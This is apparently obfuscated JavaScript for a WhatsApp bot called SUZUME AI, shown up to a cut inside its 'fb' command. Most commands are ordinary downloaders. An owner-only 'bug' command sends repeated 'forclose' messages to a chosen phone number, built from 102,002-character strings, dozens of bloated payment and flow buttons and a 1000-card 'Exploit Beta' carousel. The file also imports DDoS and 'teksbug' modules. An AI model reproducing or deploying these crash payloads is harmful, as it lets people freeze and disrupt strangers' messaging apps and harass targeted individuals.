require("./config");
const {
  generateMessageIDV2,
  generateMessageID,
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWaSocket
} = require("@adiwajshing/baileys");
const fs = require("fs");
const util = require("util");
const axios = require("axios");
const {
  exec
} = require("child_process");
const chalk = require("chalk");
const moment = require("moment-timezone");
const yts = require("yt-search");
const didyoumean = require("didyoumean");
const similarity = require("similarity");
const pino = require("pino");
const logger = pino({
  level: "debug"
});
const JSConfuser = require("js-confuser");
const crypto = require("crypto");
const path = require("path");
let aiMode = false;
module.exports = async (_0x4afd02, _0x3072e9) => {
  try {
    const _0x5616f8 = _0x3072e9.key.remoteJid;
    const _0x4d2ee = _0x3072e9.message;
    var _0x4f964a = _0x3072e9.mtype === "interactiveResponseMessage" ? JSON.parse(_0x3072e9.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x3072e9.mtype === "conversation" ? _0x3072e9.message.conversation : _0x3072e9.mtype === "deviceSentMessage" ? _0x3072e9.message.extendedTextMessage.text : _0x3072e9.mtype == "imageMessage" ? _0x3072e9.message.imageMessage.caption : _0x3072e9.mtype == "videoMessage" ? _0x3072e9.message.videoMessage.caption : _0x3072e9.mtype == "extendedTextMessage" ? _0x3072e9.message.extendedTextMessage.text : _0x3072e9.mtype == "buttonsResponseMessage" ? _0x3072e9.message.buttonsResponseMessage.selectedButtonId : _0x3072e9.mtype == "listResponseMessage" ? _0x3072e9.message.listResponseMessage.singleSelectReply.selectedRowId : _0x3072e9.mtype == "templateButtonReplyMessage" ? _0x3072e9.message.templateButtonReplyMessage.selectedId : _0x3072e9.mtype == "messageContextInfo" ? _0x3072e9.message.buttonsResponseMessage?.selectedButtonId || _0x3072e9.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x3072e9.text : "";
    const {
      smsg: _0x4183e3,
      fetchJson: _0x40d347,
      getBuffer: _0x2f8000,
      fetchBuffer: _0x5b1e0b,
      getGroupAdmins: _0x341140,
      TelegraPh: _0x48613a,
      isUrl: _0x54ede9,
      hitungmundur: _0x289a31,
      sleep: _0x51b7fd,
      clockString: _0x23c187,
      checkBandwidth: _0x38ca9d,
      runtime: _0x4d5463,
      getPing: _0x404300,
      tanggal: _0x4a5880,
      getRandom: _0x3ab050
    } = require("./lib/myfunc");
    var _0x5768f3 = typeof _0x3072e9.text == "string" ? _0x3072e9.text : "";
    var _0x2c0185 = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x4f964a) ? _0x4f964a.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
    const _0x479be9 = _0x4f964a.startsWith(_0x2c0185);
    const _0x17343c = _0x479be9 ? _0x4f964a.slice(_0x2c0185.length).trim().split(" ").shift().toLowerCase() : "";
    const _0xf66042 = _0x4f964a.trim().split(/ +/).slice(1);
    const _0x4d841c = _0xf66042.join(" ");
    const _0x40c906 = _0xf66042.join(" ");
    const _0x5c56de = _0x3072e9.key.fromMe ? _0x4afd02.user.id.split(":")[0] + "@s.whatsapp.net" || _0x4afd02.user.id : _0x3072e9.key.participant || _0x3072e9.key.remoteJid;
    const _0x9d3ee5 = await _0x4afd02.decodeJid(_0x4afd02.user.id);
    const _0x1f6f5f = _0x5c56de.split("@")[0];
    const _0x24e7b9 = _0x3072e9.pushName || "" + _0x1f6f5f;
    const _0x547f63 = JSON.parse(fs.readFileSync("./database/premium.json"));
    const _0xe666ea = [_0x9d3ee5, ..._0x547f63].map(_0x4d0e84 => _0x4d0e84.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x3072e9.sender);
    _0x4afd02.sendContact = async (_0x281840, _0x5b66e0, _0x5b61da = "", _0x125dc1 = {}) => {
      let _0x22be1c = [];
      for (let _0x22b3d0 of _0x5b66e0) {
        _0x22be1c.push({
          displayName: await AryaRyuigichi.getName(_0x22b3d0),
          vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await deltaJomok.getName(_0x22b3d0 + "@s.whatsapp.net")) + "\n\nFN:" + (await deltaJomok.getName(_0x22b3d0 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x22b3d0 + ":" + _0x22b3d0 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: ntandoofc@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://github.com/mrntandooofc\n\nitem3.X-ABLabel:GitHub\n\nitem4.ADR:;;Gabon;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
        });
      }
      _0x4afd02.sendMessage(_0x281840, {
        contacts: {
          displayName: _0x22be1c.length + " Contact",
          contacts: _0x22be1c
        },
        ..._0x125dc1
      }, {
        quoted: _0x5b61da
      });
    };
    const _0x59efbd = _0x3072e9.key.fromMe ? true : false;
    const _0x3b783c = require("os");
    const _0x1304ab = hora = moment.tz("Africa/Harare").format("HH:mm:ss");
    const _0xf35032 = date = dataa = moment.tz("Africa/Harare").format("DD/MM/YY");
    const _0x4a1360 = _0x3072e9.chat.endsWith("@g.us");
    const _0x4b0142 = _0x4d841c.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const _0x2d8df3 = _0x3072e9.mtype == "extendedTextMessage" && _0x3072e9.message.extendedTextMessage.contextInfo != null ? _0x3072e9.message.extendedTextMessage.contextInfo.mentionedJid : [];
    const _0x1091f2 = _0x3072e9.mtype == "extendedTextMessage" && _0x3072e9.message.extendedTextMessage.contextInfo != null ? _0x3072e9.message.extendedTextMessage.contextInfo.participant || "" : "";
    const _0x56e09e = _0x2d8df3[0] ? _0x2d8df3[0] : _0x1091f2 ? _0x1091f2 : _0x40c906 ? _0x4b0142 : false;
    const _0x2f3019 = _0x3072e9.quoted ? _0x3072e9.quoted : _0x3072e9;
    const _0x296b64 = (_0x2f3019.msg || _0x2f3019).mimetype || "";
    const _0x4ee58b = _0x3072e9.isGroup ? await _0x4afd02.groupMetadata(_0x5616f8).catch(_0x1f9c85 => {}) : "";
    const _0x4acff7 = _0x3072e9.isGroup ? _0x4ee58b.subject : "";
    const _0x245b3e = _0x3072e9.isGroup ? await _0x4ee58b.participants : "";
    const _0x2f32e8 = _0x3072e9.isGroup ? await _0x245b3e.filter(_0x54d204 => _0x54d204.admin === null).map(_0x54b31c => _0x54b31c.id) : [];
    const _0x464af3 = _0x3072e9.isGroup ? await _0x341140(_0x245b3e) : "";
    const _0x34948c = _0x3072e9.isGroup ? _0x464af3.includes(_0x9d3ee5) : false;
    const _0x315e32 = _0x3072e9.isGroup ? _0x464af3.includes(_0x3072e9.sender) : false;
    const _0xe4f9bf = moment.tz("Africa/Harare").format("HH:mm:ss");
    const _0x187b1a = moment.tz("Africa/Harare").format("DD/MM/YYYY");
    const _0x98583a = moment().tz("Africa/Harare").format("HH:mm:ss");
    const _0x1af1c3 = _0x4e18cd => {
      return _0x4e18cd[Math.floor(Math.random() * _0x4e18cd.length)];
    };
    const _0x56e0ff = fs.readFileSync("./bctoolsofc_v1/bctoolsofc.jpg");
    const {
      startDDoS: _0x103f6f
    } = require("./bctoolsofc_v1/DDoS");
    const {
      teksbug2: _0x4f0ce5
    } = require("./bctoolsofc_v1/delay.js");
    if (aiMode && _0x4d841c) {
      await getAIResponse(_0x4d841c, _0x3072e9);
    }
    if (_0x3072e9.message) {
      console.log("\n╭─────────────────────────────────\n│〔 OF 〕: " + _0x5c56de + "\n│\n│〔 MESSAGE 〕: " + _0x4f964a + "\n│\n│〔 NAME 〕: " + _0x24e7b9 + " \n│\n│〔 TYPE 〕: " + _0x3072e9.mtype + "\n│\n╰─────────────────────────────────");
    }
    const _0x4a95e0 = _0x40c906.replace(/[^\d]/g, "");
    const _0x59eeb8 = _0x4a95e0 + "@s.whatsapp.net";
    const _0x4e7dbf = _0x38967e => {
      _0x4afd02.sendMessage(_0x5616f8, {
        text: _0x38967e
      }, {
        quoted: _0x3072e9
      });
    };
    const _0x5ebe49 = _0x51b42d => {
      _0x4afd02.sendMessage(_0x5616f8, {
        text: _0x51b42d
      }, {
        quoted: _0x3072e9
      });
    };
    const _0x27e1a7 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net"
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0&mms3=true",
          mimetype: "text/plain",
          fileSha256: "VigI621vLq45R4KIODq41owOti/0ZXSK+aLEZOl79H8=",
          fileLength: "2143",
          pageCount: 999999999999999,
          mediaKey: "qStyFpDZOsxVCbR6oWfjM1AP6OKPloEYtoDVHeAEdxI=",
          fileName: "types.travadoc",
          fileEncSha256: "DOWZGa+9qihKxH1ZG0Fi0YhhSb1eZrFNM961Jlbzxdg=",
          directPath: "/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1714550098",
          contactVcard: true
        }
      }
    };
    let _0x1b050a = [];
    let _0x86d288 = [];
    for (let _0x3f4ded = 0; _0x3f4ded < 1000; _0x3f4ded++) {
      _0x1b050a.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "ㅤ"
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: "ㅤㅤ"
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: "\n",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z"
          }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: []
        })
      });
    }
    const _0x54e9d8 = generateWAMessageFromContent(_0x5616f8, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: "Exploit Beta™ Seven ;;"
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: global.namabot
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [..._0x1b050a]
            })
          })
        }
      }
    }, {});
    async function _0x15f748(_0x3ffac2, _0xb001a8) {
      await _0x4afd02.relayMessage(_0x3ffac2, {
        extendedTextMessage: {
          text: _0xb001a8
        },
        deviceSentMessage: {
          phash: ""
        }
      }, {});
    }
    async function _0x18f06(_0x175de6, _0x38f89a) {
      console.log("[LOG] Sending forclose to " + _0x175de6);
      let _0x41c6e9 = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
          type: "md",
          ws: {
            _events: {
              "CB:ib,,dirty": ["Array"]
            },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
              version: ["Array"],
              browser: ["Array"],
              waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
              depayyCectTimeoutMs: 20000,
              keepAliveIntervalMs: 30000,
              logger: {},
              printQRInTerminal: false,
              emitOwnEvents: true,
              defaultQueryTimeoutMs: 60000,
              customUploadHosts: [],
              retryRequestDelayMs: 250,
              maxMsgRetryCount: 5,
              fireInitQueries: true,
              auth: {
                Object: "authData"
              },
              markOnlineOndepayyCect: true,
              syncFullHistory: true,
              linkPreviewImageThumbnailWidth: 192,
              transactionOpts: {
                Object: "transactionOptsData"
              },
              generateHighQualityLinkPreview: false,
              options: {},
              appStateMacVerification: {
                Object: "appStateMacData"
              },
              mobile: true
            }
          }
        }
      });
      let _0x1a236b = [{
        attrs: {
          biz_bot: "1"
        },
        tag: "bot"
      }, {
        attrs: {},
        tag: "biz"
      }];
      let _0x2f0aaa = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              badgeChat: {
                unreadCount: 9999
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "proto@newsletter",
              serverMessageId: 1,
              newsletterName: "𖣂🩸𝐈𝐬𝖆𝖌𝖎 𝐊𝖎𝖑 𝐘𝖔𝖚🩸𖣂" + "ꥈ  ꥈ".repeat(10),
              contentType: 3,
              accessibilityText: "𖣂🩸𝐈𝐬𝖆𝖌𝖎 𝐊𝖎𝖑 𝐘𝖔𝖚🩸𖣂" + "﹏".repeat(102002)
            },
            interactiveMessage: {
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: _0x175de6
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                participant: "0@s.whatsapp.net",
                mentionedJid: ["13135550002@s.whatsapp.net"]
              },
              body: {
                text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "payment_method",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999),
                  voice_call: "call_galaxy"
                }, {
                  name: "form_message",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "catalog_message",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "payment_info",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "review_order",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "send_location",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "payments_care_csat",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "view_product",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "payment_settings",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "address_message",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "automated_greeting_message_view_catalog",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "open_webview",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "message_with_link_status",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "payment_status",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "galaxy_costum",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "extensions_message_v2",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "landline_call",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "mpm",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "cta_copy",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "cta_url",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }, {
                  name: "cta_call",
                  buttonParamsJson: _0x41c6e9 + "".repeat(9999)
                }]
              }
            }
          }
        },
        additionalNodes: _0x1a236b,
        stanzaId: "stanza_" + Date.now()
      };
      await _0x38f89a.relayMessage(_0x175de6, _0x2f0aaa, {
        participant: {
          jid: _0x175de6
        }
      });
      console.log("[SUCCESS] Sent forclose UI to " + _0x175de6);
    }
    const _0x38f7c9 = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "Halo"
      },
      message: {
        locationMessage: {
          name: "Developer Mr Ntando OFC",
          jpegThumbnail: null
        }
      }
    };
    const _0x157917 = "./bctoolsofc_v1/bctoolsofc.jpg";
    const _0x4588c2 = "./bctoolsofc_v1/Famzysound.mp3";
    const _0x4e8bc7 = "./bctoolsofc_v1/Malik.mp3";
    const _0xd670bf = fs.readFileSync(_0x4e8bc7);
    const _0x13b040 = fs.readFileSync(_0x157917);
    const _0x3c1bab = fs.readFileSync(_0x4588c2);
    const _0x10f94f = _0x14ac29 => {
      _0x4afd02.sendMessage(_0x5616f8, {
        text: _0x14ac29
      }, {
        quoted: _0x3072e9
      });
    };
    const _0x5c1285 = async _0x22663d => {
      await _0x4afd02.sendMessage(_0x3072e9.chat, {
        text: _0x22663d,
        contextInfo: {
          mentionedJid: [_0x3072e9.sender],
          forwardedNewsletterMessageInfo: {
            newsletterName: "KEITH-XMD🚀",
            newsletterJid: "120363401903613460@newsletter"
          },
          isForwarded: true,
          externalAdReply: {
            title: "KEITH-XMD",
            thumbnailUrl: "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
          }
        }
      }, {
        quoted: _0x3072e9
      });
    };
    const _0x5f1fdc = async _0x8dd6fa => {
      const _0x43b9a0 = fs.readFileSync("./bctoolsofc_v1/bctoolsofc.jpg");
      await _0x4afd02.sendMessage(_0x3072e9.chat, {
        image: _0x43b9a0,
        caption: _0x8dd6fa,
        contextInfo: {
          mentionedJid: [_0x3072e9.sender],
          forwardedNewsletterMessageInfo: {
            newsletterName: "SUZUME AI🚀",
            newsletterJid: "120363401903613460@newsletter"
          },
          isForwarded: true,
          externalAdReply: {
            title: "SUZUME AI🚀",
            thumbnailUrl: "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
          }
        }
      }, {
        quoted: _0x3072e9
      });
    };
    const _0x5a2e00 = "./database/owner.json";
    const _0x5306fe = () => {
      if (!fs.existsSync(_0x5a2e00)) {
        return [];
      }
      return JSON.parse(fs.readFileSync(_0x5a2e00));
    };
    const _0x3f183a = _0x3f3792 => {
      fs.writeFileSync(_0x5a2e00, JSON.stringify(_0x3f3792, null, 2));
    };
    const _0x2616e7 = _0x56a1df => {
      const _0x444aa9 = _0x5306fe();
      return _0x444aa9.includes(_0x56a1df);
    };
    async function _0x2bc3b1() {
      const _0x156dac = ["> *🚀 SU*", "> *🚀 SUZU*", "> *🚀 SUZUME*", "> *🤖 AI*", "> *🤖AI*", "> *🕔 L O A D I N G*", "> *🕔 L O A D I N G*", "> *🕐 L O A D I N G*", "> *🕧 L O A D I N G*"];
      let {
        key: _0x30a1e1
      } = await _0x4afd02.sendMessage(_0x3072e9.chat, {
        text: "*✅*"
      }, {
        quoted: _0x3072e9
      });
      for (let _0x577b9e = 0; _0x577b9e < _0x156dac.length; _0x577b9e++) {
        await _0x51b7fd(400);
        await _0x4afd02.sendMessage(_0x3072e9.chat, {
          text: _0x156dac[_0x577b9e],
          edit: _0x30a1e1
        }, {
          quoted: _0x3072e9
        });
      }
    }
    switch (_0x17343c) {
      case "keithmd":
        {
          try {
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              audio: _0xd670bf,
              mimetype: "audio/mpeg",
              ptt: false,
              caption: "🎵 *مالک - گانا MP3*\n\n🔥 *پاورڈ بائی SUZUME AI🚀*",
              contextInfo: {
                mentionedJid: [_0x3072e9.sender],
                forwardedNewsletterMessageInfo: {
                  newsletterName: "SUZUME AI🚀",
                  newsletterJid: "120363401903613460@newsletter"
                },
                isForwarded: true,
                externalAdReply: {
                  title: "SUZUME AI🚀|best Whatsapp bot by Mr Ntando Ofc",
                  thumbnailUrl: "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg",
                  sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
                }
              }
            }, {
              quoted: _0x3072e9
            });
            console.log("[SUCCESS] Malik.mp3 sent to " + _0x3072e9.sender);
          } catch (_0x2df23a) {
            console.error("Malik Song Error:", _0x2df23a);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "❌ *خطا:* " + (_0x2df23a.message || "گانا بھیجنے میں ناکامی۔ براہ کرم دوبارہ کوشش کریں۔") + "\n\n🔥 *پاورڈ بائی SUZUME AI🚀*"
            }, {
              quoted: _0x3072e9
            });
          }
        }
        break;
      case "bug":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (!_0x4d841c || !_0x4d841c.includes("|")) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <number>|<amount>\nExample: " + (_0x2c0185 + _0x17343c) + " 26378025349|10\n\n🚀 Powered by SUZUME AI🚀");
          }
          let [_0x5dc33f, _0x57f5d3] = _0x4d841c.split("|");
          _0x5dc33f = _0x5dc33f.replace(/[^0-9]/g, "");
          _0x57f5d3 = parseInt(_0x57f5d3);
          if (!_0x5dc33f || _0x5dc33f.length < 10) {
            return _0x4e7dbf("❌ *Invalid phone number!* Please provide a valid number (e.g., 26378025349).\n\n🚀 Powered by SUZUME AI🚀");
          }
          if (isNaN(_0x57f5d3) || _0x57f5d3 < 1 || _0x57f5d3 > 100) {
            return _0x4e7dbf("❌ *Invalid amount!* Please specify a number between 1 and 100.\n\n🚀 Powered by SUZUME AI🚀");
          }
          const _0xc4233f = _0x5dc33f + "@s.whatsapp.net";
          let _0x5c9743 = await _0x4afd02.onWhatsApp(_0xc4233f);
          if (_0x5c9743.length == 0) {
            return _0x4e7dbf("❌ *Number not registered on WhatsApp!* Please use a valid WhatsApp number.\n\n🚀 powered by SUZUME AI 🚀");
          }
          try {
            await _0x2bc3b1();
            for (let _0x27563c = 0; _0x27563c < _0x57f5d3; _0x27563c++) {
              await _0x18f06(_0xc4233f, _0x4afd02);
              await _0x51b7fd(1000);
            }
            await _0x5f1fdc("✅ *Bug Sent Successfully!*\n\n📱 *Target:* " + _0x5dc33f + "\n🔢 *Amount:* " + _0x57f5d3 + "\n\n🔥 *Powered by SUZUME AI🚀*");
          } catch (_0x2d4894) {
            console.error("Bug Command Error:", _0x2d4894);
            await _0x4e7dbf("❌ *Error:* " + (_0x2d4894.message || "Failed to send bug. Try again later.") + "\n\n🚀 Powered by SUZUME AI🚀");
          }
        }
        break;
      case "igdl":
      case "ig":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <instagram_url>\nExample: " + (_0x2c0185 + _0x17343c) + " https://www.instagram.com/reel/DIotG-1Nfm5/\n\n🔥 *Powered by SUZUME AI🚀*");
          }
          const _0x2c0cf6 = _0x4d841c.trim();
          if (!_0x54ede9(_0x2c0cf6) || !_0x2c0cf6.includes("instagram.com")) {
            return _0x4e7dbf("❌ *Invalid URL!* Please provide a valid Instagram post or reel URL (e.g., https://www.instagram.com/reel/DIotG-1Nfm5/).");
          }
          try {
            await _0x2bc3b1();
            const _0x5747e7 = "https://rest-lily.vercel.app/api/downloader/igdl?url=" + encodeURIComponent(_0x2c0cf6);
            const _0x2df794 = await axios.get(_0x5747e7, {
              headers: {
                Accept: "*/*"
              }
            });
            const _0x1b5ee1 = _0x2df794.data;
            if (_0x1b5ee1.status === true && _0x1b5ee1.data && _0x1b5ee1.data.length > 0 && _0x1b5ee1.data[0].url) {
              const _0x138186 = _0x1b5ee1.data[0].url;
              const _0x11c74c = _0x1b5ee1.data[0].thumbnail || "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg";
              const _0x4a1f60 = _0x1b5ee1.creator || "Unknown";
              const _0x48573a = "🎥 *Instagram Downloader*\n\n\n\n\n🔥 *Powered by SUZUME AI🚀*";
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                video: {
                  url: _0x138186
                },
                caption: _0x48573a,
                thumbnailUrl: _0x11c74c,
                contextInfo: {
                  mentionedJid: [_0x3072e9.sender],
                  forwardedNewsletterMessageInfo: {
                    newsletterName: "SUZUME AI",
                    newsletterJid: "120363401903613460@newsletter"
                  },
                  isForwarded: true,
                  externalAdReply: {
                    title: "SUZUME AI🚀|best bot in the universe",
                    thumbnailUrl: "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg",
                    sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
                  }
                }
              }, {
                quoted: _0x3072e9
              });
            } else {
              await _0x4e7dbf("❌ *Failed to download video:* " + (_0x1b5ee1.message || "No video found in the provided URL.") + "\nPlease check the URL and ensure the post/reel is public.");
            }
          } catch (_0x2d6541) {
            console.error("Instagram Downloader Error:", _0x2d6541);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "❌ *Error:* " + (_0x2d6541.message || "Unable to download Instagram video. Try again later.")
            }, {
              quoted: _0x3072e9
            });
          }
        }
        break;
      case "webcopy":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <url>\nExample: " + (_0x2c0185 + _0x17343c) + " https://example.com\nURL must include http:// or https://");
          }
          const _0x1bbd45 = _0x4d841c.trim();
          if (!_0x54ede9(_0x1bbd45)) {
            return _0x4e7dbf("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");
          }
          try {
            await _0x2bc3b1();
            const _0x453554 = "https://fam-official.serv00.net/sim/source.php?url=" + encodeURIComponent(_0x1bbd45);
            const _0x542339 = await axios.get(_0x453554);
            const _0x4c1b46 = _0x542339.data;
            if (_0x4c1b46.status === "success" && _0x4c1b46.sourceCode) {
              const _0x4a331a = _0x4c1b46.sourceCode;
              const _0x2322fe = "🎩 *SUZUME AI🚀Web Source Fetcher*\n\n🌐 *URL:* " + _0x1bbd45 + "\n📄 *Source Code Length:* " + _0x4c1b46.contentLength + " characters\n📅 *Fetched At:* " + _0x4c1b46.timestamp + "\n\n🔥 *Powered by SUZUME AI🚀*";
              const _0x4582d8 = generateWAMessageFromContent(_0x3072e9.chat, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: {
                        title: "🌐 Web Source Code",
                        hasMediaAttachment: false
                      },
                      body: {
                        text: _0x2322fe
                      },
                      footer: {
                        text: global.namaBot
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_copy",
                          buttonParamsJson: JSON.stringify({
                            display_text: "📋 Copy Source Code",
                            copy_code: _0x4a331a
                          })
                        }]
                      }
                    }
                  }
                }
              }, {});
              await _0x4afd02.relayMessage(_0x3072e9.chat, _0x4582d8.message, {
                messageId: _0x4582d8.key.id
              });
            } else {
              await _0x4e7dbf("❌ *Failed to fetch source code:* " + (_0x4c1b46.message || "Unknown error."));
            }
          } catch (_0x162c0a) {
            console.error("Webcopy Command Error:", _0x162c0a);
            await _0x4e7dbf("❌ *Error:* " + (_0x162c0a.message || "Unable to fetch source code. Try again later."));
          }
        }
        break;
      case "fb":
        {
          let _0x473e2c = _0x4d841c.trim();
          let _0x466d97 = null;
          if (_0x3072e9.message?.extendedTextMessage?.contextInfo?.quotedMessage && _0x3072e9.key.remoteJid.endsWith("@g.us")) {
